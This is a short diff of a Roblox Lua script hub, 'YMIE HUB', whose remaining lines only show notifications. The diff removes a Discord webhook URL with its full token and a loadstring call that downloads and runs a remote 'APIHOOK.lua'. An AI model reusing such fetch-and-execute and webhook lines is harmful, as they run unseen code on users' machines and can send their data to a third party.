@@ -1,7 +1,3 @@
----------------------------------------------------------------------------------------------------------------------------------------------
-_G.Webhook = "https://discord.com/api/webhooks/1238115881964273695/Fr9io_g5K9vl5J0N_2YPA78yeC8r7M8UywSmmlHV9Ziau-PincwWxjkuVYtJl8RfaDgl" -- Nhập Text Đã Mã Hóa Tại https://2le9.work/tools/mahoa.php
-loadstring(game:HttpGet("https://raw.githubusercontent.com/RoiseTeam/APILUA/main/APIHOOK.lua"))()
----------------------------------------------------------------------------------------------------------------------------------------------
 notis = require(game.ReplicatedStorage:WaitForChild("Notification"))
 notis.new("<Color=White>YMIE HUB MAIN<Color=/>"):Display()
 notis.new("<Color=Blue>Founder:Youtube: chuoiroblox480 <Color=/>"):Display() 
